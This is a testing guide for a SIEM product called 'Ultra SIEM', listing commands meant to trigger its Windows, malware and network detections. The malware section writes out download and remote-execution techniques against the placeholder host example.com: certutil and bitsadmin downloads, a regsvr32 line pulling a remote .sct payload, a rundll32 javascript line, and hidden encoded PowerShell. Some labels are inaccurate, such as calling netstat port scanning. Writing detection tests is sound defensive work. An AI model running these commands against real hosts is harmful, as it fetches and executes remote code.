# 🧪 **Ultra SIEM - Real-Time Detection Testing Guide**

## 🎯 **Overview**

This guide shows you how to test your Ultra SIEM's real-time threat detection capabilities with actual system activities. Your SIEM monitors:

- 🔍 **Windows Security Events** (failed logins, process creation, service events)
- 🌐 **Network Traffic** (suspicious connections, DNS queries, port scanning)
- 📁 **File System** (suspicious file operations, malware patterns)
- ⚙️ **Process Monitoring** (suspicious process creation, command injection)

## 🚀 **Quick Start Testing**

### **Option 1: Automated Test**

```powershell
.\test_real_detection.ps1
```

### **Option 2: Manual Testing**

1. Start infrastructure: `docker-compose -f docker-compose.simple.yml up -d`
2. Start detection engines: `cargo run` (in rust-core directory)
3. Run specific tests below

## 🔍 **Windows Event Detection Tests**

### **Test 1: Failed Login Detection**

**What it detects:** Event ID 4625 (Failed Login Attempts)

**How to test:**

1. Press `Ctrl+Alt+Delete`
2. Click "Switch User"
3. Try logging in with wrong password
4. Repeat 2-3 times

**Expected detection:** Failed login events with source IP and username

### **Test 2: Process Creation Detection**

**What it detects:** New process creation events

**How to test:**

```powershell
# Open PowerShell and run:
Get-Process | Select-Object -First 5
tasklist
Start-Process notepad.exe
```

**Expected detection:** Process creation events with process name and parent process

### **Test 3: Service Events**

**What it detects:** Service start/stop events

**How to test:**

```powershell
# Run as Administrator:
Get-Service | Select-Object -First 10
sc query
```

**Expected detection:** Service-related events with service name and status

## 🦠 **Malware Detection Tests**

### **Test 1: PowerShell Malware Detection**

**What it detects:** Encoded PowerShell commands

**How to test:**

```powershell
# These are SAFE test commands:
powershell.exe -enc SGVsbG8gV29ybGQ=
powershell.exe -windowstyle hidden -enc SGVsbG8gV29ybGQ=
```

**Expected detection:** Encoded PowerShell execution with confidence score

### **Test 2: Command Injection Detection**

**What it detects:** Command injection patterns

**How to test:**

```cmd
# Open Command Prompt:
cmd.exe /c whoami
cmd.exe /c net user
cmd.exe /c dir
```

**Expected detection:** Command injection patterns with severity level

### **Test 3: File Download Detection**

**What it detects:** Suspicious file downloads

**How to test:**

```cmd
# Run as Administrator:
certutil.exe -urlcache -split -f http://example.com/test.exe
bitsadmin.exe /transfer test http://example.com/test.exe C:\temp\test.exe
```

**Expected detection:** File download attempts with source URL

### **Test 4: DLL Hijacking Detection**

**What it detects:** DLL hijacking attempts

**How to test:**

```cmd
# Run as Administrator:
regsvr32.exe /s /n /u /i:http://example.com/payload.sct scrobj.dll
rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();
```

**Expected detection:** DLL hijacking patterns with high severity

## 🌐 **Network Detection Tests**

### **Test 1: Suspicious Connections**

**What it detects:** Unusual network connections

**How to test:**

```cmd
netstat -an
netstat -an | findstr :80
netstat -an | findstr :443
```

**Expected detection:** Network connection events with source/destination

### **Test 2: DNS Query Monitoring**

**What it detects:** DNS resolution requests

**How to test:**

```cmd
nslookup google.com
nslookup microsoft.com
ping google.com
```

**Expected detection:** DNS query events with domain names

### **Test 3: Port Scanning Detection**

**What it detects:** Port scanning activities

**How to test:**

```cmd
# Run as Administrator:
netstat -an | findstr LISTENING
netstat -an | findstr ESTABLISHED
```

**Expected detection:** Port scanning patterns with port ranges

### **Test 4: Web Traffic Monitoring**

**What it detects:** HTTP/HTTPS traffic

**How to test:**

1. Open web browser
2. Visit: http://google.com
3. Visit: https://microsoft.com
4. Visit: http://localhost:3000 (Grafana dashboard)

**Expected detection:** Web traffic events with URLs and user agents

## 📊 **Monitoring Your Tests**

### **Real-Time Dashboard**

- **URL:** http://localhost:3000
- **Username:** admin
- **Password:** admin

### **Dashboard Panels**

1. **Real Threats Detected** - Count of detected threats
2. **Threat Types Distribution** - Pie chart of threat categories
3. **Real-Time Threat Timeline** - Time-series of detections
4. **Confidence Scores** - Detection confidence levels
5. **Severity Levels** - Threat severity distribution

### **Query Database Directly**

```sql
-- Check recent threats
SELECT * FROM real_threats
WHERE timestamp >= now() - INTERVAL 1 HOUR
ORDER BY timestamp DESC;

-- Count by threat type
SELECT threat_type, count()
FROM real_threats
WHERE timestamp >= now() - INTERVAL 1 HOUR
GROUP BY threat_type;

-- Average confidence
SELECT avg(confidence)
FROM real_threats
WHERE timestamp >= now() - INTERVAL 1 HOUR;
```

## ⚡ **Performance Testing**

### **Load Testing**

```powershell
# Generate high-volume events
.\scripts\production_simulation.ps1
```

### **Latency Testing**

```powershell
# Test detection latency
.\scripts\benchmark.ps1
```

## 🔧 **Troubleshooting**

### **No Threats Detected?**

1. **Check services are running:**

   ```powershell
   docker ps
   Get-Process | Where-Object {$_.ProcessName -like "*cargo*" -or $_.ProcessName -like "*go*"}
   ```

2. **Check database connectivity:**

   ```powershell
   Invoke-RestMethod -Uri "http://localhost:8123/ping"
   ```

3. **Check NATS connectivity:**
   ```powershell
   Invoke-RestMethod -Uri "http://localhost:8222/varz"
   ```

### **Low Detection Rate?**

1. **Increase event volume** - Run more test activities
2. **Check detection rules** - Verify patterns are being triggered
3. **Review confidence thresholds** - Adjust sensitivity if needed

### **High False Positives?**

1. **Review detection patterns** - Check for overly broad rules
2. **Adjust confidence thresholds** - Increase minimum confidence
3. **Whitelist legitimate activities** - Add exclusions for normal operations

## 📈 **Expected Results**

### **Detection Performance**

- **Latency:** <5ms detection time
- **Throughput:** 1M+ events/sec processing
- **Accuracy:** >95% detection rate for known patterns
- **False Positives:** <5% for normal activities

### **Threat Categories**

- **Windows Events:** Failed logins, process creation, service events
- **Malware:** PowerShell malware, command injection, file downloads
- **Network:** Suspicious connections, DNS queries, port scanning
- **File System:** Suspicious file operations, malware patterns

## 🎯 **Advanced Testing**

### **Custom Threat Simulation**

```powershell
# Create custom test scenarios
.\scripts\custom_threat_simulation.ps1
```

### **Multi-Vector Attacks**

```powershell
# Test complex attack scenarios
.\scripts\advanced_attack_simulation.ps1
```

### **Performance Benchmarking**

```powershell
# Benchmark detection performance
.\scripts\performance_benchmark.ps1
```

## 🧹 **Cleanup**

### **Stop All Services**

```powershell
# Stop Docker containers
docker stop clickhouse-test nats-test grafana-test
docker rm clickhouse-test nats-test grafana-test

# Stop detection engines
Get-Process | Where-Object {$_.ProcessName -like "*cargo*" -or $_.ProcessName -like "*go*"} | Stop-Process
```

### **Reset Database**

```powershell
# Clear test data
Invoke-RestMethod -Uri "http://localhost:8123" -Method POST -Body "TRUNCATE TABLE real_threats"
```

## 📞 **Support**

If you encounter issues:

1. Check the logs in `rust-core/logs/` and `go-services/logs/`
2. Review the troubleshooting section above
3. Check the dashboard for error messages
4. Verify all services are running correctly

---

**🎉 Your Ultra SIEM is now ready for real-time threat detection!**
